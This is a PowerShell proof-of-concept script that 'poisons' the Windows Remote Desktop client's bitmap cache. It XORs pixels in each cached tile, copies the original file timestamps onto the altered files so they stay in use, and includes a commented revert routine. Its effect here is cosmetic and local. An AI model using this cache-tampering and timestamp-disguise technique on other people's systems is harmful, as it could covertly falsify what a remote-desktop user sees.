# simple rdp cache poisoning demo. Run it, and then connect through RDP.
# the script will fail if files are open for any reason.
# if you see any useful purpose, let me know.

$DebugPreference = "Continue"

$bpp = 4 #bytes per pixel
$fileheadersize = 12
$entryHeaderSize = 12
$fileHeader = New-Object byte[] $fileHeaderSize
$entryHeader = New-Object byte[] $entryHeaderSize

$cacheFilePath=(Get-ChildItem Env:\LOCALAPPDATA).Value+"\Microsoft\Terminal Server Client\Cache\Cache000?.bin"

foreach ($cacheFile in (Get-ChildItem -Path $cacheFilePath).FullName)
{
    Write-Debug $cacheFile
    $newFile = $cacheFile+".new" 
    Remove-Item -Path $newFile -ErrorAction SilentlyContinue #blindly delete
    
    $fileSize = (Get-ChildItem $cacheFile).Length
    if ($fsr) # better safe than sorry.
    {
        $fsr.Close()
    }
    if ($fsw) 
    {
        $fsw.Close()
    }

    $fsr = new-object IO.FileStream($cacheFile, [IO.FileMode]::Open)
    $reader = new-object IO.BinaryReader($fsr)

    $fsw = new-object IO.FileStream($newFile, [IO.FileMode]::CreateNew)
    $writer = new-object IO.BinaryWriter($fsw)

    $reader.Read($fileHeader,0,$fileHeaderSize) | Out-Null
    $writer.Write($fileHeader)

    while ($true)
    {
        Write-Progress -Activity "Poisoning $cachefile" -PercentComplete (100 * $fsr.Position / $fileSize )
        $bytesRead = $reader.Read($entryHeader, 0, $entryHeaderSize)
        if ($bytesRead -ne $entryHeaderSize)
        {
            break #end of file
        }
        $writer.Write($entryHeader)

        $tileWidth = $entryHeader[9]*256+$entryHeader[8]
        $tileHeight = $entryHeader[11]*256+$entryHeader[10]

        $readBufSize = $bpp * $tileWidth * $tileHeight 
        $readBuf = New-Object byte[] $readBufSize #sorry for creating it inside the loop, but its size will differ. Fingers crossed for GC.
        $bytesRead = $reader.Read($readBuf, 0, $readBufSize)
        if ($bytesRead -ne $readBufSize)
        {
            break
        }
    
        # messing with the tile content stored in $readBuf. Feel free to mess on your own.
        $min = [Math]::Min($tileWidth,$tileHeight)
        for ($i=8; $i -lt $min-8; $i++)
        {
            $readBuf[$bpp*$min*$i+$bpp*$i+1] = $readBuf[$bpp*$min*$i+$bpp*$i+1] -bxor 255
            $readBuf[$bpp*$min*$i+$bpp*$i+5] = $readBuf[$bpp*$min*$i+$bpp*$i+5] -bxor 255
            $readBuf[$bpp*$min*$i-$bpp*$i] = $readBuf[$bpp*$min*$i-$bpp*$i] -bxor 255
            $readBuf[$bpp*$min*$i-$bpp*$i+4] = $readBuf[$bpp*$min*$i-$bpp*$i+4] -bxor 255
        }

        $writer.Write($readBuf) 
        Remove-Variable readBuf
    }
    $fsw.Close()
    $fsr.Close()

    #set file date/time to the original one, as it is used in the caching algorithm
    (Get-ChildItem -Path $newFile).CreationTime = (Get-ChildItem -Path $cacheFile).CreationTime
    (Get-ChildItem -Path $newFile).LastAccessTime = (Get-ChildItem -Path $cacheFile).LastAccessTime
    (Get-ChildItem -Path $newFile).LastWriteTime = (Get-ChildItem -Path $cacheFile).LastWriteTime

    # save backup, rename poisoned
    Rename-Item -Path $cacheFile -NewName ($cacheFile + ".old") -ErrorAction SilentlyContinue # if original file exists let's leave it.
    Remove-Item -Path $cacheFile -ErrorAction SilentlyContinue # try to remove if rename failed as the original exists.
    Rename-Item -Path $newFile -NewName ($cacheFile.Replace(".new",""))
}

# revert:
# 
# foreach ($fileName in (Get-ChildItem -Path ((Get-ChildItem Env:\LOCALAPPDATA).Value+"\Microsoft\Terminal Server Client\Cache\Cache000?.bin.old")).FullName)
# {
#     Write-Debug $fileName
#     Remove-Item -Path $fileName.Replace(".old","")
#     Rename-Item -Path $fileName -NewName $fileName.Replace(".old","")
# }
